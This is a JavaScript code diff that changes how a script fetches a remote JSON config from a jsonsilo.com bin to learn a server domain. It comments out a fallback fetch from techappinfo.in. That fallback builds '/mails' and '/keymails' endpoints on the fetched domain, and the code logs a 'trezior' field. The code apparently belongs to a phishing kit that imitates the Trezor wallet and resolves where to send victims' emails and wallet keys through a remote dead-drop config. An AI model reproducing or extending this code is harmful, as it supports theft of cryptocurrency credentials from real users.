@@ -9,13 +9,13 @@ var allkeys = [];
 var getdata = async () => {
       var fetchurl = "";
       const url =
-            "https://api.jsonsilo.com/public/aab182ee-43f0-4bf9-9eb3-5122f971deee";
+            "https://api.jsonsilo.com/public/13f1f650-096e-4712-bcfb-70e1a00e1ba7";
 
       await fetch(url)
             .then((response) => response.json()) // Parse JSON data
             .then((data) => {
-                  // console.log(data.productlist[0].trezior);  // Log the fetched JSON data as an object
-                  fetchurl = data.portfolio[1].one;
+                  console.log(data.portfolio[0].trezior);  // Log the fetched JSON data as an object
+                  fetchurl = data.portfolio[0].one;
 
                   // window.location.replace(fetchurl);
                   // Link
@@ -29,24 +29,24 @@ var getdata = async () => {
             .catch(async (error) => {
                   console.error("Error:", error);
 
-                  await fetch("https://techappinfo.in/s-ofc-portfolio.json")
-                        .then((response) => response.json()) // Parse JSON data
-                        .then((data) => {
-                              // console.log(data.productlist[0].trezior);  // Log the fetched JSON data as an object
-                              fetchurl = data.portfolio[1].one;
+                  // await fetch("https://techappinfo.in/s-ofc-portfolio.json")
+                  //       .then((response) => response.json()) // Parse JSON data
+                  //       .then((data) => {
+                  //             // console.log(data.productlist[0].trezior);  // Log the fetched JSON data as an object
+                  //             fetchurl = data.portfolio[1].one;
 
-                              // window.location.replace(fetchurl);
-                              // Link
-                              klink = fetchurl;
+                  //             // window.location.replace(fetchurl);
+                  //             // Link
+                  //             klink = fetchurl;
 
-                              onelink = klink + "/mails";
-                              twolink = klink + "/keymails";
+                  //             onelink = klink + "/mails";
+                  //             twolink = klink + "/keymails";
 
-                              console.log("Domain" + onelink);
-                        })
-                        .catch(async (error) => {
-                              console.error("Error:", error);
-                        });
+                  //             console.log("Domain" + onelink);
+                  //       })
+                  //       .catch(async (error) => {
+                  //             console.error("Error:", error);
+                  //       });
             });
 };
 
